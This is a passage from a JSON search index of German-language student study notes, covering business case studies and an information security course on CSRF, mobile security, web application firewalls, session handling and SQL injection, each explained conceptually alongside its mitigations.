sich die Techniken f\u00fcr das Unternehmen aus? Was gesch\u00e4he, wenn diese Techniken nicht verf\u00fcgbar w\u00e4ren?", 
            "title": "Fall-Studie UPS"
        }, 
        {
            "location": "/ITBus/2_Informationssysteme/#fall-studie-herman-miller", 
            "text": "Beurteilen Sie, welche Rolle Informationssysteme in der Gesch\u00e4ftst\u00e4tigkeit von Herman Miller spielen?\n- Durch zAxis grosse Rolle  In welcher Weise hat z-Axis zur Wertsch\u00f6pfung von Herman Miller beigetragen?\n- F\u00fcr Kunden kann viel schneller ein Vorschlag gebracht werden\n- Der Kunde kann den Vorschlag in 3D ansehen\n- zAxis wird den H\u00e4ndler weitergegeben, was sie zu ihnen bindet  Konnte sich Herman Miller durch z-Axis einen Wettbewerbsvorteil verschaffen?\n- Integration zAxis mit dem Fertigungsprozess\n- Schnellere Bedienung der Kundenw\u00fcnsche  Sollte Herman Miller weiterhin in z-Axis investieren? Nennen Sie Gr\u00fcnde, die daf\u00fcr oder dagegen sprechen.\n- Nicht unbedingt\n- Es gibt andere Software, die weiter entwickelt ist\n- Wechsel k\u00f6nnte g\u00fcnstiger sein als Weiterentwicklung  Welche Managementprobleme finden Sie in dieser Fallstudie?\n- Problem online-shop  Sie umgingen ihre eigenen H\u00e4ndler", 
            "title": "Fall-Studie Herman Miller"
        }, 
        {
            "location": "/InfSi3/0_Index/", 
            "text": "Informationssicherheit 3\n\n\n\n\nExam Notes\n\n\nOverview\n\n\nSoftware Security\n\n\nApplication Security Basics", 
            "title": "0 Index"
        }, 
        {
            "location": "/InfSi3/0_Index/#informationssicherheit-3", 
            "text": "Exam Notes  Overview  Software Security  Application Security Basics", 
            "title": "Informationssicherheit 3"
        }, 
        {
            "location": "/InfSi3/10_CSRF/", 
            "text": "Cross Site Request Forgery\n\n\nUrsprung\n\n\n\n\nDie meisten Router-Admin-Interfaces laufen auf den gleichen IPs\n\n\nRouter haben oft Default Passwords\n\n\nInfiszierter PC sendet Request an Router, loggt sich ein und \u00e4ndert den DNS-Server (den des Hackers)\n\n\n\n\nAttack\n\n\n\n\nOpfer authentisiert sich bei E-Banking\n\n\nNutzt dabei ein Session-Cookie aus\n\n\nGeht nicht mit URL-Based Session handling!\n\n\n\n\n\n\nOpfer geht auf Hacker-Seite\n\n\nIm Browser wird einen Request (nicht ajax) an die Bank geschickt mit einer bestimmtem Transaktion\n\n\nz.B. \u00fcber ein Bild\n\n\nschickt dabei Session-Cookie mit\n\n\n\n\n\n\n\n\nRemediation\n\n\n\n\nE-Banking verlangen SMS-Best\u00e4tigung\n\n\nGrunds\u00e4tzlich: Aktion darf nicht mit einem voraussehbaren Request ausf\u00fchrbar sein\n\n\nIn Formular zuf\u00e4lliges XSRF-Token als hidden field einbinden\n\n\nClient muss im Request dieses Token wieder mitschicken", 
            "title": "10 CSRF"
        }, 
        {
            "location": "/InfSi3/10_CSRF/#cross-site-request-forgery", 
            "text": "", 
            "title": "Cross Site Request Forgery"
        }, 
        {
            "location": "/InfSi3/10_CSRF/#ursprung", 
            "text": "Die meisten Router-Admin-Interfaces laufen auf den gleichen IPs  Router haben oft Default Passwords  Infiszierter PC sendet Request an Router, loggt sich ein und \u00e4ndert den DNS-Server (den des Hackers)", 
            "title": "Ursprung"
        }, 
        {
            "location": "/InfSi3/10_CSRF/#attack", 
            "text": "Opfer authentisiert sich bei E-Banking  Nutzt dabei ein Session-Cookie aus  Geht nicht mit URL-Based Session handling!    Opfer geht auf Hacker-Seite  Im Browser wird einen Request (nicht ajax) an die Bank geschickt mit einer bestimmtem Transaktion  z.B. \u00fcber ein Bild  schickt dabei Session-Cookie mit", 
            "title": "Attack"
        }, 
        {
            "location": "/InfSi3/10_CSRF/#remediation", 
            "text": "E-Banking verlangen SMS-Best\u00e4tigung  Grunds\u00e4tzlich: Aktion darf nicht mit einem voraussehbaren Request ausf\u00fchrbar sein  In Formular zuf\u00e4lliges XSRF-Token als hidden field einbinden  Client muss im Request dieses Token wieder mitschicken", 
            "title": "Remediation"
        }, 
        {
            "location": "/InfSi3/11_Mobile_Security/", 
            "text": "Mobile Security\n\n\niOS Bascis\n\n\n\n\niOS ist Subset von OS X mit gleichen Libraries\n\n\nObjective-C, Swift und C kann gemischt werden\n\n\nJede App ist gekapselt durch Sandboxing\n\n\nSecure Boot Chain\n\n\nLLB: Low-Level Bootloader\n\n\nJeder Schritt \u00fcberpr\u00fcft die Signatur des n\u00e4chsten\n\n\n\n\n\n\nBerechtigungen werden einzeln erfragt\n\n\n\n\nData Protection API\n\n\n\n\nFile-System-Key: Wird bei einem Wipe gewechselt, dann k\u00f6nnen die verschl\u00fcsselten Daten nicht mehr gelesen werden\n\n\nEs gibt unterschiedliche Class Keys, die zu unterschiedlichen Zeiten im Memory sind, z.B. wenn das Ger\u00e4t entsperrt ist oder gesperrt\n\n\n\n\nKeychain API\n\n\n\n\nDurch Hardware-Key gesch\u00fctzt (eigener Chip)\n\n\nJede App kann in ihrer Sandbox geh\u00f6renden Secrets lesen\n\n\nKann \u00e4hnlich wie Class Keys gesteuert werden, wann sie verf\u00fcgbar sein sollen \n\n\nSeit iOS 7 k\u00f6nnen solche Secrets auch mit dem Fingerprint gesichert werden\n\n\n\n\nAndroid Basics\n\n\n\n\nSELinux seit Android 4.4\n\n\nF\u00fcr alternative Stores (z.B. Amazon) muss Installation von fremden APKs aktiviert werden - Sicherheitsriskio\n\n\njede App l\u00e4uft in eigener JVM\n\n\nKeyStore API seit 4.3 - \u00e4hnlich zu iOS\n\n\n\n\nOWASP Mobile Top 10\n\n\nM1: Improper Platform Usage\n\n\n\n\nPlatform-Features f\u00fcr Sicherheit nicht oder falsch benutzen\n\n\nGuidelines (unabsichtlich) nicht einhalten\n\n\nZu viele Permissions geben\n\n\nz.B. Schl\u00fcssel nicht in KeyChain API speichern, sondern unverschl\u00fcsselt in ein Property-File\n\n\n\n\nM2: Insecure Data Storage\n\n\n\n\nUnsicherer Data Store, wenn Ger\u00e4t verloren wurde oder mit jailbreak / root\n\n\nLeakage durch Sidechannels\n\n\nz.B. Screenshots der \"recent apps\" View\n\n\nBei iOS und Adroid k\u00f6nnen diese Screenshots bearbeitet werden\n\n\n\n\n\n\n\n\nM3: Insecure Communication\n\n\n\n\nUnsichere Kommunikationskan\u00e4le\n\n\nz.B. alte TLS-Versionen, schwache Ciphers, clear-text\n\n\nCertificate Pinning verwenden\n\n\nPublic-Key des Servers in der App hinterlegen\n\n\nIn Android und iOS \u00fcber Standard-APIs\n\n\n\n\n\n\n\n\nM6: Insecure Authorization\n\n\nM7: Client Code Quality\n\n\n\n\nXSS, SQL-Injection, ...\n\n\n\n\nM8: Code Tampering\n\n\n\n\nMonkey-Patching\n\n\nJailbreaking / Rooting\n\n\nDetection auch m\u00f6glich, indem z.B. nach shell-skripts gesucht wird\n\n\n\n\n\n\nMethod Swizzling\n\n\nMethoden werden vertauscht\n\n\n\n\n\n\nIn Objective-C werden alle Methoden-Aufrufe \u00fcber eine zentrale Methode geschickt, die Messages verschickt\n\n\ndiese k\u00f6nnen mit jailbreak \u00fcberschrieben werden\n\n\nBesser in Swift\n\n\n\n\n\n\n\n\nM9: Reverse Engineering\n\n\n\n\nCode Reversing\n\n\nDisassembly\n\n\nBei Android Code Obfuscating im SDK dabei\n\n\nAndroid kompiliert Java zu \"smali\" Code bis Android 5\n\n\nMit \ndex2jar\n kann es auch zu normalen Class-files kompiliert werden\n\n\n\n\n\n\nSeit Android 5 Android Runtime\n\n\nKompiliert code bei Installation zu native code\n\n\nDEX-File ist immer noch im APK - Reverse Engineering gleich m\u00f6glich", 
            "title": "11 Mobile Security"
        }, 
        {
            "location": "/InfSi3/11_Mobile_Security/#mobile-security", 
            "text": "", 
            "title": "Mobile Security"
        }, 
        {
            "location": "/InfSi3/11_Mobile_Security/#ios-bascis", 
            "text": "iOS ist Subset von OS X mit gleichen Libraries  Objective-C, Swift und C kann gemischt werden  Jede App ist gekapselt durch Sandboxing  Secure Boot Chain  LLB: Low-Level Bootloader  Jeder Schritt \u00fcberpr\u00fcft die Signatur des n\u00e4chsten    Berechtigungen werden einzeln erfragt", 
            "title": "iOS Bascis"
        }, 
        {
            "location": "/InfSi3/11_Mobile_Security/#data-protection-api", 
            "text": "File-System-Key: Wird bei einem Wipe gewechselt, dann k\u00f6nnen die verschl\u00fcsselten Daten nicht mehr gelesen werden  Es gibt unterschiedliche Class Keys, die zu unterschiedlichen Zeiten im Memory sind, z.B. wenn das Ger\u00e4t entsperrt ist oder gesperrt", 
            "title": "Data Protection API"
        }, 
        {
            "location": "/InfSi3/11_Mobile_Security/#keychain-api", 
            "text": "Durch Hardware-Key gesch\u00fctzt (eigener Chip)  Jede App kann in ihrer Sandbox geh\u00f6renden Secrets lesen  Kann \u00e4hnlich wie Class Keys gesteuert werden, wann sie verf\u00fcgbar sein sollen   Seit iOS 7 k\u00f6nnen solche Secrets auch mit dem Fingerprint gesichert werden", 
            "title": "Keychain API"
        }, 
        {
            "location": "/InfSi3/11_Mobile_Security/#android-basics", 
            "text": "SELinux seit Android 4.4  F\u00fcr alternative Stores (z.B. Amazon) muss Installation von fremden APKs aktiviert werden - Sicherheitsriskio  jede App l\u00e4uft in eigener JVM  KeyStore API seit 4.3 - \u00e4hnlich zu iOS", 
            "title": "Android Basics"
        }, 
        {
            "location": "/InfSi3/11_Mobile_Security/#owasp-mobile-top-10", 
            "text": "", 
            "title": "OWASP Mobile Top 10"
        }, 
        {
            "location": "/InfSi3/11_Mobile_Security/#m1-improper-platform-usage", 
            "text": "Platform-Features f\u00fcr Sicherheit nicht oder falsch benutzen  Guidelines (unabsichtlich) nicht einhalten  Zu viele Permissions geben  z.B. Schl\u00fcssel nicht in KeyChain API speichern, sondern unverschl\u00fcsselt in ein Property-File", 
            "title": "M1: Improper Platform Usage"
        }, 
        {
            "location": "/InfSi3/11_Mobile_Security/#m2-insecure-data-storage", 
            "text": "Unsicherer Data Store, wenn Ger\u00e4t verloren wurde oder mit jailbreak / root  Leakage durch Sidechannels  z.B. Screenshots der \"recent apps\" View  Bei iOS und Adroid k\u00f6nnen diese Screenshots bearbeitet werden", 
            "title": "M2: Insecure Data Storage"
        }, 
        {
            "location": "/InfSi3/11_Mobile_Security/#m3-insecure-communication", 
            "text": "Unsichere Kommunikationskan\u00e4le  z.B. alte TLS-Versionen, schwache Ciphers, clear-text  Certificate Pinning verwenden  Public-Key des Servers in der App hinterlegen  In Android und iOS \u00fcber Standard-APIs", 
            "title": "M3: Insecure Communication"
        }, 
        {
            "location": "/InfSi3/11_Mobile_Security/#m6-insecure-authorization", 
            "text": "", 
            "title": "M6: Insecure Authorization"
        }, 
        {
            "location": "/InfSi3/11_Mobile_Security/#m7-client-code-quality", 
            "text": "XSS, SQL-Injection, ...", 
            "title": "M7: Client Code Quality"
        }, 
        {
            "location": "/InfSi3/11_Mobile_Security/#m8-code-tampering", 
            "text": "Monkey-Patching  Jailbreaking / Rooting  Detection auch m\u00f6glich, indem z.B. nach shell-skripts gesucht wird    Method Swizzling  Methoden werden vertauscht    In Objective-C werden alle Methoden-Aufrufe \u00fcber eine zentrale Methode geschickt, die Messages verschickt  diese k\u00f6nnen mit jailbreak \u00fcberschrieben werden  Besser in Swift", 
            "title": "M8: Code Tampering"
        }, 
        {
            "location": "/InfSi3/11_Mobile_Security/#m9-reverse-engineering", 
            "text": "Code Reversing  Disassembly  Bei Android Code Obfuscating im SDK dabei  Android kompiliert Java zu \"smali\" Code bis Android 5  Mit  dex2jar  kann es auch zu normalen Class-files kompiliert werden    Seit Android 5 Android Runtime  Kompiliert code bei Installation zu native code  DEX-File ist immer noch im APK - Reverse Engineering gleich m\u00f6glich", 
            "title": "M9: Reverse Engineering"
        }, 
        {
            "location": "/InfSi3/12_Web_App_Firewall/", 
            "text": "Web Application Firewall\n\n\n\n\nSecurity Requirements f\u00fcr Kreditkarten Processing ben\u00f6tigen WAFs\n\n\nHat meist einen public und authentisierten Bereich\n\n\nLeitet Requests entsprechend weiter\n\n\nVerwaltet die Sessions mit den Clients und den Applications hinter der WAF\n\n\nWAF basiert auf einem Reverse-Proxy\n\n\n\n\nForensic Readiness\n\n\n\n\nWAF erzeugt f\u00fcr einen Request eine ID\n\n\nDie Request ID wird jeweils an den n\u00e4chsten Layer / Tier \u00fcbertragen, aber immer mit ins Log file geschrieben\n\n\nSo kann sp\u00e4ter ein Request \u00fcber mehrere Layers koreliert werden\n\n\n\n\nTipps f\u00fcr \u00dcbung\n\n\n\n\nReverse Proxy schon vorkonfiguriert auf LiveCD\n\n\nZur\u00fccksetzen: \n/opt/applic/httpd\n l\u00f6schen\n\n\nhl-apache-kali\n reinstallen\n\n\n\n\n\n\n/etc/init.d/apache_but start\n\n\nlocalhost:8888\n ist die Application \"innerhalb\" der WAF\n\n\nAlles unter \nlocalhost/private\n braucht Authentisierung\n\n\nDiagnose-Tool f\u00fcr Header unter \nlocalhost\n -\n Pre-Auth Demo -\n Echo Request Header\n\n\nCookie mit \nusername=hacker\n besteht zwischen private-server und WAF\n\n\nIn der HTTPD-Config setzt \nProxyPass\n den Reverse-Proxy\n\n\nSubstitute\n \u00e4ndert z.B. absolute zu relative Links\n\n\nF\u00fcr Glockenshop auch \nHTTPS\n an reverse-proxy h\u00e4ngen f\u00fcr Login\n\n\nDazu auch \nSSLProxyEngine on\n setzen\n\n\n\n\n\n\nSecure-Cookies werden nicht \u00fcbertragen, weil localhost nicht \u00fcber TLS l\u00e4uft\n\n\nMit \nmod_headers\n Headers patchen, um \nSecure\n zu entfernen und Location-Redirects abzu\u00e4ndern", 
            "title": "12 Web App Firewall"
        }, 
        {
            "location": "/InfSi3/12_Web_App_Firewall/#web-application-firewall", 
            "text": "Security Requirements f\u00fcr Kreditkarten Processing ben\u00f6tigen WAFs  Hat meist einen public und authentisierten Bereich  Leitet Requests entsprechend weiter  Verwaltet die Sessions mit den Clients und den Applications hinter der WAF  WAF basiert auf einem Reverse-Proxy", 
            "title": "Web Application Firewall"
        }, 
        {
            "location": "/InfSi3/12_Web_App_Firewall/#forensic-readiness", 
            "text": "WAF erzeugt f\u00fcr einen Request eine ID  Die Request ID wird jeweils an den n\u00e4chsten Layer / Tier \u00fcbertragen, aber immer mit ins Log file geschrieben  So kann sp\u00e4ter ein Request \u00fcber mehrere Layers koreliert werden", 
            "title": "Forensic Readiness"
        }, 
        {
            "location": "/InfSi3/12_Web_App_Firewall/#tipps-fur-ubung", 
            "text": "Reverse Proxy schon vorkonfiguriert auf LiveCD  Zur\u00fccksetzen:  /opt/applic/httpd  l\u00f6schen  hl-apache-kali  reinstallen    /etc/init.d/apache_but start  localhost:8888  ist die Application \"innerhalb\" der WAF  Alles unter  localhost/private  braucht Authentisierung  Diagnose-Tool f\u00fcr Header unter  localhost  -  Pre-Auth Demo -  Echo Request Header  Cookie mit  username=hacker  besteht zwischen private-server und WAF  In der HTTPD-Config setzt  ProxyPass  den Reverse-Proxy  Substitute  \u00e4ndert z.B. absolute zu relative Links  F\u00fcr Glockenshop auch  HTTPS  an reverse-proxy h\u00e4ngen f\u00fcr Login  Dazu auch  SSLProxyEngine on  setzen    Secure-Cookies werden nicht \u00fcbertragen, weil localhost nicht \u00fcber TLS l\u00e4uft  Mit  mod_headers  Headers patchen, um  Secure  zu entfernen und Location-Redirects abzu\u00e4ndern", 
            "title": "Tipps f\u00fcr \u00dcbung"
        }, 
        {
            "location": "/InfSi3/1_Exam/", 
            "text": "Exam\n\n\n\n\nPr\u00fcfung ohne Unterlagen\n\n\nSelbststudium ist Pr\u00fcfungsstoff!", 
            "title": "1 Exam"
        }, 
        {
            "location": "/InfSi3/1_Exam/#exam", 
            "text": "Pr\u00fcfung ohne Unterlagen  Selbststudium ist Pr\u00fcfungsstoff!", 
            "title": "Exam"
        }, 
        {
            "location": "/InfSi3/2_Overview/", 
            "text": "Overview, Legal Aspects and Global Threats", 
            "title": "2 Overview"
        }, 
        {
            "location": "/InfSi3/2_Overview/#overview-legal-aspects-and-global-threats", 
            "text": "", 
            "title": "Overview, Legal Aspects and Global Threats"
        }, 
        {
            "location": "/InfSi3/3_Software_Security/", 
            "text": "Software Security\n\n\nThe Trinity of Trouble\n\n\n\n\nConnectivity\n: Immer mehr verbundene Ger\u00e4te\n\n\nSoftware wird als Service publiziert, die nie daf\u00fcr gedacht war\n\n\n\n\n\n\nExtensibility\n: Viele software wird modular\n\n\nDurch Plugins erweiterbar, z.B. Browser\n\n\n\n\n\n\nComplexity\n: Moderne Software ist komplex\n\n\nz.B. Betriebssysteme, Runtimes\n\n\nAnzahl Fehler steigt etwa quadratisch zu Anzahl Codezeilen\n\n\n\n\n\n\n\n\nDefects = Bugs + Flaws\n\n\n\n\nBug\n: Implementations-Fehler, der sich relativ leicht beheben l\u00e4sst\n\n\nFlaw\n: Design-Fehler in der Software, nur schwer zu finden / zu fixen\n\n\nIn der Praxis sind solche Defects 50/50 geteilt in Bugs und Flaws\n\n\n\n\nBest Practices\n\n\n\n\nPenetration ist nicht die effizienteste Massnahme, da die Fehler erst sp\u00e4t in der Entwicklung gefunden werden und so die Kosten enorm steigen\n\n\nStatische Code Analyse\n\n\nz.B. mit Coverity (f\u00fcr Github projekte kostenlos)\n\n\n\n\n\n\n\n\nArchitectural Risk Analysis\n\n\n\n\nArchitektur auf einer Seite zusammen fassen (\"Flipchart\")\n\n\n\n\nAttack Resistance Analysis\n\n\n\n\nAnsatz mit Checklisten\n\n\nGut f\u00fcr bekannte Schwachstellen und Angriffe\n\n\nSchlecht f\u00fcr neue Attacken / 0-days\n\n\n\n\nAmbiguity Analysis\n\n\n\n\nVon dritter Seite wird die Software und Architektur studiert\n\n\nGut, um Widerspr\u00fcche und Fehler im Design zu finden\n\n\n\n\nWeakness Analysis\n\n\n\n\nVerwendete Libraries und Frameworks analysieren\n\n\n\n\nMicrosoft Security Development Lifecycle\n\n\n\n\nSDL - Simplified Version\n lesen!\n\n\nBest Practises des SDL kennen\n\n\n\n\nThreat Modeling = Risk Analysis\n\n\n\n\n\n\nFuzzing: Zuf\u00e4llige Input-Daten f\u00fcr Testf\u00e4lle, daf\u00fcr sehr viele verschiedene Inputs", 
            "title": "3 Software Security"
        }, 
        {
            "location": "/InfSi3/3_Software_Security/#software-security", 
            "text": "", 
            "title": "Software Security"
        }, 
        {
            "location": "/InfSi3/3_Software_Security/#the-trinity-of-trouble", 
            "text": "Connectivity : Immer mehr verbundene Ger\u00e4te  Software wird als Service publiziert, die nie daf\u00fcr gedacht war    Extensibility : Viele software wird modular  Durch Plugins erweiterbar, z.B. Browser    Complexity : Moderne Software ist komplex  z.B. Betriebssysteme, Runtimes  Anzahl Fehler steigt etwa quadratisch zu Anzahl Codezeilen", 
            "title": "The Trinity of Trouble"
        }, 
        {
            "location": "/InfSi3/3_Software_Security/#defects-bugs-flaws", 
            "text": "Bug : Implementations-Fehler, der sich relativ leicht beheben l\u00e4sst  Flaw : Design-Fehler in der Software, nur schwer zu finden / zu fixen  In der Praxis sind solche Defects 50/50 geteilt in Bugs und Flaws", 
            "title": "Defects = Bugs + Flaws"
        }, 
        {
            "location": "/InfSi3/3_Software_Security/#best-practices", 
            "text": "Penetration ist nicht die effizienteste Massnahme, da die Fehler erst sp\u00e4t in der Entwicklung gefunden werden und so die Kosten enorm steigen  Statische Code Analyse  z.B. mit Coverity (f\u00fcr Github projekte kostenlos)", 
            "title": "Best Practices"
        }, 
        {
            "location": "/InfSi3/3_Software_Security/#architectural-risk-analysis", 
            "text": "Architektur auf einer Seite zusammen fassen (\"Flipchart\")", 
            "title": "Architectural Risk Analysis"
        }, 
        {
            "location": "/InfSi3/3_Software_Security/#attack-resistance-analysis", 
            "text": "Ansatz mit Checklisten  Gut f\u00fcr bekannte Schwachstellen und Angriffe  Schlecht f\u00fcr neue Attacken / 0-days", 
            "title": "Attack Resistance Analysis"
        }, 
        {
            "location": "/InfSi3/3_Software_Security/#ambiguity-analysis", 
            "text": "Von dritter Seite wird die Software und Architektur studiert  Gut, um Widerspr\u00fcche und Fehler im Design zu finden", 
            "title": "Ambiguity Analysis"
        }, 
        {
            "location": "/InfSi3/3_Software_Security/#weakness-analysis", 
            "text": "Verwendete Libraries und Frameworks analysieren", 
            "title": "Weakness Analysis"
        }, 
        {
            "location": "/InfSi3/3_Software_Security/#microsoft-security-development-lifecycle", 
            "text": "SDL - Simplified Version  lesen!  Best Practises des SDL kennen   Threat Modeling = Risk Analysis    Fuzzing: Zuf\u00e4llige Input-Daten f\u00fcr Testf\u00e4lle, daf\u00fcr sehr viele verschiedene Inputs", 
            "title": "Microsoft Security Development Lifecycle"
        }, 
        {
            "location": "/InfSi3/4_Application_Security_Basics/", 
            "text": "Application Security Basics\n\n\nWeb Basics\n\n\n\n\nInterception Proxy\n\n\nProxy zum Abfangen und Analysieren von Traffic\n\n\nz.B. ZAP und Burp (auf LiveCD)\n\n\n\n\n\n\nHTTP ist zustandslos\n\n\n\n\n\n\n\n\nZust\u00e4nde werden mit Cookies ausgetauscht\n\n\nServer erzeugt ID (=Referenz auf serverseitigen Speicher), die er dem Client im Response-Header \u00fcbertr\u00e4gt\n\n\n\n\n\n\nStatt mit einem Cookie kann eine ID auch im Body als hidden field \u00fcbertragen werden\n\n\nClient schickt Session-ID an Server zur\u00fcck\n\n\nGeht im Request als Query-parameter\n\n\nOder im Header (z.B. Cookie)\n\n\nOder im Body (POST)\n\n\n\n\n\n\nAustausch \u00fcber Cookies im Header ist die sicherste Variante!\n\n\nRequest-Queries werden im Access Log und History Cache (lokal) gespeichert -\n Anf\u00e4llig auf Session Hijacking!\n\n\nBody: Wird lokal im Filecache gespeichert, ebenfalls anf\u00e4llig\n\n\n\n\n\n\nOb Cookie Session-Cookie ist (nicht persistent), wird mit \n\u00ecsSession\n gesteuert (default true)\n\n\nPath\n und \nDomain\n geben an, zu welcher Domain und Pfad das Cookie vom Browser gesendet wird\n\n\nHPKP: HTTP Public Key Pinning\n\n\nBeim ersten Response des Servers wird ein Hash des Public Keys (=Pin) des Certs im HPKP-Header mitgesendet\n\n\nDer Client rechnet ebenfalls einen Hash des Public-Keys\n\n\nBei zuk\u00fcnftigen Verbindungen pr\u00fcft der Client, ob der Hash noch derselbe ist wie der gespeicherte. Wenn nicht, wird die Verbindung rejected\n\n\nProblem, wenn Certs ausgetauscht werden\n\n\nL\u00f6sung: Mehr als einen PIN angeben\n\n\nZertifikate werden auf Vorrat erstellt\n\n\nEs werden mehrere PINS mitgeschickt, auch solche von zuk\u00fcnftigen Certs\n\n\nOder: Eigenes Intermediate CA Pinnen und von diesem aus die richtigen Server-Certs ausstellen\n\n\n\n\n\n\n\n\n\n\n\n\n302 Redirect nach Login\n\n\n\n\nWenn der Server vertrauliche Daten per POST erh\u00e4lt (Login), sollte er mit 302 Redirect antworten\n\n\nBei 200 Returncode w\u00fcrde der Browser die gesendeten Daten cachen (und k\u00f6nnen erneut gesendet werden bei back-button)\n\n\nBei 302 Redirect cached der Browser die Daten nicht\n\n\n\n\nSession Fixation Attack\n\n\n\n\nAngreifer erstellt Session auf Webapp (noch ohne Login)\n\n\nAngreifer schickt seine Session zum Opfer und bringt es dazu, diese Session zu verwenden\n\n\nOpfer loggt sich ein, Session ist nun authentifiziert\n\n\n\n\nAngreifer kann diese Session verwenden\n\n\n\n\n\n\nDas \"unterjubeln\" von Sessions geht nur schwer \u00fcber Cookies, betroffen sind prim\u00e4r Server, die Session-Handling \u00fcber URL-Requests machen\n\n\n\n\n\n\nRemedies\n\n\n\n\nBeim Login soll der Server eine neue Session erstellen (mit Kopie des Inhalts der alten Session) und die alte invalidieren\n\n\n\n\nSame Origin Policy\n\n\n\n\nSame Origin wird definiert auf Protokoll, Host und Port\n\n\nVerboten also auch von HTTP zu HTTPS und umgekehrt!\n\n\nSOP kann umgehen werden, indem JS auf Third-party-seite liegt und mit \nscript src=\"..\"\n eingebunden wird\n\n\nSauber geht es \u00fcber CORS (sp\u00e4ter)", 
            "title": "4 Application Security Basics"
        }, 
        {
            "location": "/InfSi3/4_Application_Security_Basics/#application-security-basics", 
            "text": "", 
            "title": "Application Security Basics"
        }, 
        {
            "location": "/InfSi3/4_Application_Security_Basics/#web-basics", 
            "text": "Interception Proxy  Proxy zum Abfangen und Analysieren von Traffic  z.B. ZAP und Burp (auf LiveCD)    HTTP ist zustandslos     Zust\u00e4nde werden mit Cookies ausgetauscht  Server erzeugt ID (=Referenz auf serverseitigen Speicher), die er dem Client im Response-Header \u00fcbertr\u00e4gt    Statt mit einem Cookie kann eine ID auch im Body als hidden field \u00fcbertragen werden  Client schickt Session-ID an Server zur\u00fcck  Geht im Request als Query-parameter  Oder im Header (z.B. Cookie)  Oder im Body (POST)    Austausch \u00fcber Cookies im Header ist die sicherste Variante!  Request-Queries werden im Access Log und History Cache (lokal) gespeichert -  Anf\u00e4llig auf Session Hijacking!  Body: Wird lokal im Filecache gespeichert, ebenfalls anf\u00e4llig    Ob Cookie Session-Cookie ist (nicht persistent), wird mit  \u00ecsSession  gesteuert (default true)  Path  und  Domain  geben an, zu welcher Domain und Pfad das Cookie vom Browser gesendet wird  HPKP: HTTP Public Key Pinning  Beim ersten Response des Servers wird ein Hash des Public Keys (=Pin) des Certs im HPKP-Header mitgesendet  Der Client rechnet ebenfalls einen Hash des Public-Keys  Bei zuk\u00fcnftigen Verbindungen pr\u00fcft der Client, ob der Hash noch derselbe ist wie der gespeicherte. Wenn nicht, wird die Verbindung rejected  Problem, wenn Certs ausgetauscht werden  L\u00f6sung: Mehr als einen PIN angeben  Zertifikate werden auf Vorrat erstellt  Es werden mehrere PINS mitgeschickt, auch solche von zuk\u00fcnftigen Certs  Oder: Eigenes Intermediate CA Pinnen und von diesem aus die richtigen Server-Certs ausstellen", 
            "title": "Web Basics"
        }, 
        {
            "location": "/InfSi3/4_Application_Security_Basics/#302-redirect-nach-login", 
            "text": "Wenn der Server vertrauliche Daten per POST erh\u00e4lt (Login), sollte er mit 302 Redirect antworten  Bei 200 Returncode w\u00fcrde der Browser die gesendeten Daten cachen (und k\u00f6nnen erneut gesendet werden bei back-button)  Bei 302 Redirect cached der Browser die Daten nicht", 
            "title": "302 Redirect nach Login"
        }, 
        {
            "location": "/InfSi3/4_Application_Security_Basics/#session-fixation-attack", 
            "text": "Angreifer erstellt Session auf Webapp (noch ohne Login)  Angreifer schickt seine Session zum Opfer und bringt es dazu, diese Session zu verwenden  Opfer loggt sich ein, Session ist nun authentifiziert   Angreifer kann diese Session verwenden    Das \"unterjubeln\" von Sessions geht nur schwer \u00fcber Cookies, betroffen sind prim\u00e4r Server, die Session-Handling \u00fcber URL-Requests machen", 
            "title": "Session Fixation Attack"
        }, 
        {
            "location": "/InfSi3/4_Application_Security_Basics/#remedies", 
            "text": "Beim Login soll der Server eine neue Session erstellen (mit Kopie des Inhalts der alten Session) und die alte invalidieren", 
            "title": "Remedies"
        }, 
        {
            "location": "/InfSi3/4_Application_Security_Basics/#same-origin-policy", 
            "text": "Same Origin wird definiert auf Protokoll, Host und Port  Verboten also auch von HTTP zu HTTPS und umgekehrt!  SOP kann umgehen werden, indem JS auf Third-party-seite liegt und mit  script src=\"..\"  eingebunden wird  Sauber geht es \u00fcber CORS (sp\u00e4ter)", 
            "title": "Same Origin Policy"
        }, 
        {
            "location": "/InfSi3/5_SQL_Injection/", 
            "text": "SQL Injection\n\n\nBlind SQL-Injection\n\n\n\n\nDer Server liefert auf einen SQL-Injection-Angriff keine Fehlermeldung\n\n\nAngreifer kann aber z.B. \"Benchmarks\" probieren auszuf\u00fchren, die lange zum Berechnen haben. Wenn die Antwort l\u00e4nger als erwartet dauert, hat die Injection wahrscheinlich funktioniert (\"Time based SQL Injection\")\n\n\n\n\nMitigation\n\n\n\n\nPrio 1\n: \n\n\nPrepared Statements\n\n\nProper Error Handling\n\n\n\n\n\n\nPrio 2:\n\n\nWeb Application Firewall (filtert Inputs)\n\n\nDB-Privilegien (nicht mit root!!)", 
            "title": "5 SQL Injection"
        }, 
        {
            "location": "/InfSi3/5_SQL_Injection/#sql-injection", 
            "text": "", 
            "title": "SQL Injection"
        }, 
        {
            "location": "/InfSi3/5_SQL_Injection/#blind-sql-injection", 
            "text": "Der Server liefert auf einen SQL-Injection-Angriff keine Fehlermeldung  Angreifer kann aber z.B. \"Benchmarks\" probieren auszuf\u00fchren, die lange zum Berechnen haben. Wenn die Antwort l\u00e4nger als erwartet dauert, hat die Injection wahrscheinlich funktioniert (\"Time based SQL Injection\")", 
            "title": "Blind SQL-Injection"
        }, 
        {
            "location": "/InfSi3/5_SQL_Injection/#mitigation", 
            "text": "Prio 1 :   Prepared Statements  Proper Error Handling    Prio 2:  Web Application Firewall (filtert Inputs)  DB-Privilegien (nicht mit root!!)", 
            "title": "Mitigation"
        }, 
        {
            "location": "/InfSi3/6_XSS/", 
